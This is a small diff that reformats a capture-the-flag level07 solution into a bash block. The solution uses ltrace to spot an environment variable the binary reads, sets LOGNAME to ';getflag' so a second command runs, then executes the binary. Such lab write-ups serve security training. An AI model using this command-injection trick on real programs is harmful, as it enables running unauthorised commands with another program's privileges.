@@ -1,5 +1,8 @@
-ltrace ./level07 =] LOGNAME
+```bash
+$ ltrace ./level07 =] LOGNAME
 
-export LOGNAME=';getflag'
+$ export LOGNAME=';getflag'
 
-./level07
+$ ./level07
+
+```
